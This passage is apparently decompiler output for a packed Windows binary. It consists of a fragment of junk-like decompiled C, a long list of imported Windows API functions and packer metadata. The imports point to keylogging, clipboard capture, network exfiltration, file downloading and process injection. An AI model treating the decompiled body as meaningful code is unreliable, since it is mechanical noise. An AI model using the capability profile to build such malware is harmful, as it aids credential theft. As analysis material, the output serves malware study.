    int32_t v1; // 0x40e128
    float64_t v2 = *(float64_t *)(v1 - 61); // 0x40e129
    uint32_t v3; // 0x40e128
    int32_t v4; // 0x40e128
    __asm_outsb((int16_t)v4, (char)v3);
    int32_t v5; // 0x40e128
    bool v6; // 0x40e128
    *(char *)-0xdaf0051 = (char)(v5 + 11 + (int32_t)v6) | 65;
    int32_t v7 = *(int32_t *)0x5bf3ec7a; // 0x40e141
    int32_t v8 = v7 ^ v3; // 0x40e156
    int32_t v9 = 2 * v3; // 0x40e15f
    __asm_int1(a1);
    uint32_t v10 = (*(int32_t *)v7 - 0x6e845f6c >> 31) + 11; // 0x40e164
    int32_t v11 = unknown_635df73a(); // 0x40e167
    float80_t v12; // 0x40e128
    *(float32_t *)v9 = (float32_t)(v12 * (float80_t)v2);
    int32_t v13; // 0x40e128
    *(int32_t *)v8 = v13 & -256 | 198;
    int32_t v14 = v9 | 1; // 0x40e178
    int32_t v15 = (v11 & -132) - 0xe9f0fa3 + (int32_t)(v3 < *(int32_t *)v14); // 0x40e17d
    int32_t v16 = *(int32_t *)0x37e7ae04; // 0x40e188
    int32_t v17 = v16 + v10; // 0x40e188
    *(int32_t *)0x37e7ae04 = v17;
    bool v18; // 0x40e128
    *(char *)((v18 ? -4 : 4) + v14) = (char)v15;
    if (v17 < 0) {
        // 0x40e1cc
        return v15 & -0xff01 | 256 * (16 * (int32_t)((v16 & 15) + (v10 & 15) > 15) | (int32_t)(v10 > (v16 ^ -1)) | 4 * (int32_t)((llvm_ctpop_i8((char)v17) & 1) == 0)) | 0x8200;
    }
    // 0x40e193
    return *(int32_t *)(v8 + 28);
}

// --------------- Dynamically Linked Functions ---------------

// LRESULT CallNextHookEx(_In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
// BOOL CloseClipboard(VOID);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int CompareStringA(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZCH lpString1, _In_ int cchCount1, PCNZCH lpString2, _In_ int cchCount2);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HWND CreateWindowExA(_In_ DWORD dwExStyle, _In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName, _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth, _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu, _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam);
// LRESULT DefWindowProcA(_In_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// LRESULT DispatchMessageA(_In_ const MSG * lpMsg);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL EnumWindows(_In_ WNDENUMPROC lpEnumFunc, _In_ LPARAM lParam);
// VOID ExitProcess(_In_ UINT uExitCode);
// int32_t ExitProcess2(void);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// HWND FindWindowExA(_In_opt_ HWND hWndParent, _In_opt_ HWND hWndChildAfter, _In_opt_ LPCSTR lpszClass, _In_opt_ LPCSTR lpszWindow);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// VOID FreeLibraryAndExitThread(_In_ HMODULE hLibModule, _In_ DWORD dwExitCode);
// BOOL GetCaretPos(_Out_ LPPOINT lpPoint);
// BOOL GetCharWidthA(_In_ HDC hdc, _In_ UINT iFirst, _In_ UINT iLast, LPINT lpBuffer);
// DWORD GetClassLongA(_In_ HWND hWnd, _In_ int nIndex);
// int GetClassNameA(_In_ HWND hWnd, LPSTR lpClassName, _In_ int nMaxCount);
// HANDLE GetClipboardData(_In_ UINT uFormat);
// LPSTR GetCommandLineA(VOID);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentThreadId(VOID);
// HDC GetDC(_In_opt_ HWND hWnd);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// BOOL GetKeyboardState(PBYTE lpKeyState);
// int GetKeyboardType(_In_ int nTypeFlag);
// int GetLocaleInfoA(_In_ LCID Locale, _In_ LCTYPE LCType, LPSTR lpLCData, _In_ int cchData);
// BOOL GetMessageA(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HWND GetParent(_In_ HWND hWnd);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HGDIOBJ GetStockObject(_In_ int i);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// LCID GetThreadLocale(void);
// DWORD GetTickCount(VOID);
// int32_t GetTickCount2(void);
// HWND GetTopWindow(_In_opt_ HWND hWnd);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// HWND GetWindow(_In_ HWND hWnd, _In_ UINT uCmd);
// LONG GetWindowLongA(_In_ HWND hWnd, _In_ int nIndex);
// DWORD GetWindowThreadProcessId(_In_ HWND hWnd, _Out_opt_ LPDWORD lpdwProcessId);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// LPVOID GlobalLock(_In_ HGLOBAL hMem);
// BOOL GlobalUnlock(_In_ HGLOBAL hMem);
// u_short htons(_In_ u_short hostshort);
// PVOID ImageDirectoryEntryToData(_In_ PVOID Base, _In_ BOOLEAN MappedAsImage, _In_ USHORT DirectoryEntry, _Out_ PULONG Size);
// char * inet_ntoa(_In_ struct in_addr in);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL IsWindow(_In_opt_ HWND hWnd);
// BOOL IsWindowVisible(_In_ HWND hWnd);
// BOOL KillTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR uIDEvent);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HICON LoadIconA(_In_opt_ HINSTANCE hInstance, _In_ LPCSTR lpIconName);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// int32_t LocalAlloc2(void);
// HLOCAL LocalFree(HLOCAL hMem);
// int32_t LocalFree2(void);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int MessageBoxA(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
// BOOL OpenClipboard(_In_opt_ HWND hWndNewOwner);
// BOOL PathFileExistsA(_In_ LPCSTR pszPath);
// BOOL PostMessageA(_In_opt_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID PostQuitMessage(_In_ int nExitCode);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// int32_t RegCloseKey2(void);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteKeyA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// int32_t RegOpenKeyExA2(void);
// LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int32_t RegQueryValueExA2(void);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int ReleaseDC(_In_opt_ HWND hWnd, _In_ HDC hDC);
// HGDIOBJ SelectObject(_In_ HDC hdc, _In_ HGDIOBJ h);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// LRESULT SendMessageA(_In_ HWND hWnd, _In_ UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
// UINT_PTR SetTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR nIDEvent, _In_ UINT uElapse, _In_opt_ TIMERPROC lpTimerFunc);
// LONG SetWindowLongA(_In_ HWND hWnd, _In_ int nIndex, _In_ LONG dwNewLong);
// HHOOK SetWindowsHookExA(_In_ int idHook, _In_ HOOKPROC lpfn, _In_opt_ HINSTANCE hmod, _In_ DWORD dwThreadId);
// HINSTANCE ShellExecuteA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpOperation, _In_ LPCSTR lpFile, _In_opt_ LPCSTR lpParameters, _In_opt_ LPCSTR lpDirectory, _In_ INT nShowCmd);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// void SysFreeString(_In_opt_ BSTR bstrString);
// INT SysReAllocStringLen(_Inout_ BSTR * pbstr, const OLECHAR * psz, _In_ unsigned int len);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// int ToAscii(_In_ UINT uVirtKey, _In_ UINT uScanCode, const BYTE * lpKeyState, _Out_ LPWORD lpChar, _In_ UINT uFlags);
// BOOL UnhookWindowsHookEx(_In_ HHOOK hhk);
// HRESULT URLDownloadToFileA(_In_opt_ LPUNKNOWN, _In_ LPCSTR, _In_opt_ LPCSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);
// int32_t URLDownloadToFileA2(void);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// BOOL VirtualProtect(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int32_t WriteFile2(void);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);
// int WSACleanup(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: maskpe
// Detected functions: 629
